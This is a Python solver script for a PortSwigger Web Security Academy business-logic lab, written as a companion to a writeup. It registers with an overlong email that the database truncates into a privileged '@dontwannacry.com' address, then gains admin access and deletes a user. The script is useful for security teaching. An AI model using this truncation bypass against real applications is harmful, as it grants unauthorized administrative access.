#!/usr/bin/env python3
"""
Inconsistent handling of exceptional input
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 06-inconsistent-handling-of-exceptional-input.md

What this does:
    Registers with an email address longer than the application's
    255-character database truncation limit, constructed so the *first*
    255 characters read as ending in "@dontwannacry.com" while the full,
    untruncated address routes real mail to the lab's exploit-server inbox
    (the mail server honors the full address; the access-control check only
    ever sees the truncated 255-character prefix stored in the database).
    Confirms via the exploit-server email client, logs in, and reaches the
    admin panel to delete carlos.

Usage:
    python 06-inconsistent-handling-of-exceptional-input.py <lab-url>
    e.g. python 06-inconsistent-handling-of-exceptional-input.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import random
import re
import string
import sys
import time
import httpx


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str, username: str, password: str) -> None:
    csrf = _get_csrf(client, f"{base}/login")
    client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    c = httpx.Client(follow_redirects=True, timeout=15)

    email_domain = ""
    for path in ["/register", "/", "/login", "/email"]:
        r = c.get(f"{lab_url}{path}")
        dm = re.search(r'(exploit-[^"\'<>\s]+\.exploit-server\.net)', r.text)
        if not dm:
            dm = re.search(r'(exploit-[^"\'<>\s]+\.web-security-academy\.net)', r.text)
        if dm:
            email_domain = dm.group(1).rstrip("/")
            break

    if not email_domain:
        print("[-] Could not discover the exploit-server email client domain.")
        return
    print(f"[*] Email client domain: {email_domain}")

    # Full email: {padding}@dontwannacry.com.{email_domain}
    # After truncation to 255 chars: {padding}@dontwannacry.com
    # padding_len = 255 - len("@dontwannacry.com") = 255 - 17 = 238
    target_suffix = "@dontwannacry.com"
    padding_len = 255 - len(target_suffix)
    long_email = "a" * padding_len + target_suffix + "." + email_domain
    print(f"[*] Constructed {len(long_email)}-char email, truncates to '...{target_suffix}' at 255")

    rnd = ''.join(random.choices(string.ascii_lowercase, k=6))
    username = f"hacker{rnd}"

    csrf = _get_csrf(c, f"{lab_url}/register")
    c.post(f"{lab_url}/register", data={
        "csrf": csrf,
        "username": username,
        "email": long_email,
        "password": "password123"
    })
    print(f"[*] Registered as {username}")

    time.sleep(2)
    email_page = c.get(f"https://{email_domain}/email")
    confirm_m = re.search(r"(https?://[^\"'<>\s]+temp-registration-token=[^\"'<>\s]+)", email_page.text)
    if not confirm_m:
        confirm_m = re.search(r"(https?://[^\"'<>\s]+register\?[^\"'<>\s]+)", email_page.text)
    if not confirm_m:
        confirm_m = re.search(r"(https?://[^\"'<>\s]+confirm[^\"'<>\s]*)", email_page.text)

    if not confirm_m:
        print("[-] No confirmation email found.")
        return
    c.get(confirm_m.group(1))
    print(f"[*] Confirmed registration via {confirm_m.group(1)[:80]}...")

    _login(c, lab_url, username, "password123")

    admin_r = c.get(f"{lab_url}/admin")
    del_url = re.search(r'href="(/admin/delete\?username=carlos)"', admin_r.text)
    if del_url:
        c.get(f"{lab_url}{del_url.group(1)}")
        print(f"[*] Deleted carlos via {del_url.group(1)}")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- truncated email landed inside @dontwannacry.com's access control.")
    else:
        print("[-] Not solved yet -- check /my-account for the stored, truncated email.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
